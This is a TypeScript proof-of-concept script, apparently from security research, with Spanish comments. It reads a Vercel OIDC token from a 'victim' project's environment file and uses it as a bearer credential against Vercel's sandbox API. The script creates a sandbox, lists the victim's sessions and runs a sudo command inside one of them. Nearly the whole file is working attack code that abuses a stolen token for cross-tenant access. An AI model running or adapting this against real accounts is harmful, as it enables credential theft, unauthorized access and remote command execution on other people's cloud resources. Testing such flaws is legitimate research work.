import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const BASE = "https://vercel.com/api";
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());
console.log("nbf:", V.nbf, "now:", Math.floor(Date.now() / 1000), "exp:", V.exp);

async function call(label: string, method: string, path: string, query: Record<string, string> = {}, body?: any, extraHeaders: Record<string,string> = {}) {
  const url = new URL(BASE + path);
  for (const [k, v] of Object.entries(query)) if (v) url.searchParams.set(k, v);
  const r = await fetch(url, {
    method,
    headers: { authorization: `Bearer ${VICTIM}`, "content-type": "application/json", "user-agent": "vercel/sandbox/3.0.0 (Node.js/v24; linux/x64)", ...extraHeaders },
    body: body ? JSON.stringify(body) : undefined,
  });
  const text = await r.text();
  console.log(`\n[${r.status}] ${label}\n  ${method} ${url.pathname}?${url.searchParams.toString()}`);
  console.log("  " + (text.length > 400 ? text.slice(0, 400) + "…" : text));
}

async function main() {
  // Crear sandbox con la víctima
  const created: any = await call("V: POST crear sandbox", "POST", "/v2/sandboxes", { teamId: V.owner_id }, {
    projectId: V.project_id, name: "debug-v", resources: { vcpus: 1 }, timeout: 300000,
  });
  // extraer session id del body
  const body = await (await fetch(new URL(BASE + "/v2/sandboxes?project=" + V.project_id + "&limit=1&teamId=" + V.owner_id), {
    headers: { authorization: `Bearer ${VICTIM}`, "content-type": "application/json" },
  })).json().catch(() => null);
  const vsid = body?.sessions?.[0]?.id;
  console.log("\nSID:", vsid);

  if (vsid) {
    await call("V: GET su session", "GET", `/v2/sandboxes/sessions/${vsid}`, { teamId: V.owner_id });
    await call("V: GET list sessions", "GET", `/v2/sandboxes/sessions`, { project: V.project_id, teamId: V.owner_id, limit: "5" });
    await call("V: POST cmd en su session", "POST", `/v2/sandboxes/sessions/${vsid}/cmd`, { teamId: V.owner_id }, { command: "id", args: [], env: {}, sudo: true });
  }
}
main().catch((e) => console.error("ERR", e.message));